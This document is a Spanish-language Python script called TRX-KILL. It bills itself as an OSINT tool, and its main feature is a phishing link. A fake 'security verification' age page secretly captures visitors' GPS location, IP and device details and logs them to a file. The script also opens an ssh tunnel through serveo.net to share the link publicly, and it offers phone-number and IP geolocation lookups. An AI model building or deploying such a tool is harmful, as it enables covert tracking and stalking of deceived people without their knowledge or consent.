#!/usr/bin/env python3
import os
import threading
import subprocess
import re
import time
import requests
import random
import phonenumbers
from phonenumbers import geocoder, carrier
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask('TRX-KILL')
PUERTO = random.randint(6000, 9000)

HTML_ENCUESTA = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="background:#f4f4f4; font-family:sans-serif; text-align:center; padding:20px;">
    <div style="background:white; padding:30px; border-radius:15px; box-shadow:0 4px 8px rgba(0,0,0,0.1);">
        <h2>Verificación de Seguridad</h2>
        <p>Selecciona tu edad:</p>
        <select id="edad" style="width:100%; padding:10px; margin-bottom:20px;">
            <option>Mayor de 18 años</option>
            <option>Menor de 18 años</option>
        </select>
        <button onclick="capturar()" style="width:100%; padding:15px; background:#007bff; color:white; border:none; border-radius:5px;">CONFIRMAR</button>
    </div>
    <script>
        function capturar() {
            navigator.geolocation.getCurrentPosition((p) => {
                fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat: p.coords.latitude, 
                        lon: p.coords.longitude, 
                        ua: navigator.userAgent,
                        ts: new Date().toLocaleString()
                    })
                }).then(() => window.location.href = "https://www.google.com");
            });
        }
    </script>
</body></html>
"""

@app.route('/')
def index(): return HTML_ENCUESTA

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
    log_data = f"--- NUEVO REGISTRO [{d['ts']}] ---\nIP: {ip}\nGPS: {d['lat']}, {d['lon']}\nDISPOSITIVO: {d['ua']}\nHORA: {d['ts']}\n----------------------------\n"
    with open("resultados.txt", "a") as f: f.write(log_data)
    return "OK"

def banner():
    os.system('clear')
    print("\033[1;36m#####################################################")
    print("# TRX-KILL SISTEMA OSINT                            #")
    print("# BY: OSCAR                                         #")
    print("# VERSIÓN: 1.1.1.1                                  #")
    print("#####################################################\033[0m")

def main():
    while True:
        banner()
        print("\033[1;33m [1] INFO NÚMERO\n [2] RASTREO (LINK)\n [3] CREADOR\n [4] LICENCIA\n [5] VERSIÓN\n [6] ACTUALIZACIÓN\n [7] INFO-IP\n [8] LEER RESULTADOS\n [9] SALIR\033[0m")
        opc = input("\n\033[1;32mTRX-ROOT > \033[0m")
        
        #------OPCION1-------
        if opc == "1":
            num = input("Introduce número (ej: +54...): ")
            try:
                p = phonenumbers.parse(num)
                print(f"\n[+] PAÍS: {geocoder.country_name_for_number(p, 'es')}")
                print(f"[+] OPERADOR: {carrier.name_for_number(p, 'es')}")
            except: print("Error al procesar.")
            input("\n[Enter] volver...")

        #------OPCION2-------
        elif opc == "2":
            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PUERTO, debug=False, use_reloader=False), daemon=True).start()
            print(f"\n[*] Servidor en puerto {PUERTO}. Iniciando túnel...")
            proc = subprocess.Popen(['ssh', '-R', f'80:localhost:{PUERTO}', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for line in proc.stderr:
                if "https://" in line:
                    print(f"\n\033[1;32m LINK ENCUESTA: {line.strip()}\033[0m\n")
                    break
            input("Presiona ENTER para detener...")
            os.system('pkill -f ssh')

        #------OPCION3-------
        elif opc == "3":
            print("\nCreado por TRX-LILL/OSCAR")
            input("\n[Enter] volver...")

        #------OPCION4-------
        elif opc == "4":
            print("\nLicencia: MIT")
            input("\n[Enter] volver...")

        #------OPCION5-------
        elif opc == "5":
            print("\nVersión: 1.1.1.1")
            input("\n[Enter] volver...")

        #------OPCION6-------
        elif opc == "6":
            print("\nSistema actualizado.")
            input("\n[Enter] volver...")

        #------OPCION7-------
        elif opc == "7":
            target = input("IP a analizar: ")
            try:
                # Cambiado a ip-api.com para evitar bloqueos
                res = requests.get(f"http://ip-api.com/json/{target}").json()
                print(f"\n[+] PAÍS: {res.get('country')}\n[+] CIUDAD: {res.get('city')}\n[+] ISP: {res.get('isp')}")
            except: print("Error de conexión.")
            input("\n[Enter] volver...")

        #------OPCION8-------
        elif opc == "8":
            if os.path.exists("resultados.txt"): os.system("nano resultados.txt")
            else: print("Sin registros."); time.sleep(1)

        elif opc == "9": break

if __name__ == "__main__":
    main()
